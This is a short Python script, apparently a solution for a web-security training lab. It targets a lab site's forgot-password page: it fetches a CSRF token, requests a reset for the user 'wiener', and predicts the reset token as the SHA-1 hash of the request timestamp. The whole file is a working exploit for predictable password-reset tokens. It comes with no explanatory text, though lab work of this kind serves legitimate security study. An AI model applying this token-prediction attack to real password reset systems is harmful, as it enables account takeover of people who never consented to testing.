import requests
import time
import hashlib

DOMAIN = "0ad9003b0412cbbb82863845000300f4.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{DOMAIN}/forgot-password",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Cookie": "phpsessionid=VtF0Yp6AobTqQ4RJxByQdVx6QyFS2ytG",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

def get_csrf_token():
    response = requests.get(f"https://{DOMAIN}/forgot-password", headers=HEADERS)
    csrf_token = response.text.split('name="csrf" value="')[1].split('"')[0]
    return csrf_token

def send_reset_request(username):
    csrf_token = get_csrf_token()
    data = {
        "csrf": csrf_token,
        "username": username
    }

    time_seed = time.time()
    response = requests.post(f"https://{DOMAIN}/forgot-password", headers=HEADERS, data=data)
    print(f"Elapsed time of request: {response.elapsed.total_seconds()}")
    print(f"Sending reset request for {username}", f"time: {time_seed}")

    potential_token = hashlib.sha1(f"{int(time_seed)}".encode()).hexdigest()
    print(f"Potential token: {potential_token}")
        

    if "Please check your email for a reset password link." in response.text:
        print(f"Reset request sent for {username}")


send_reset_request("wiener")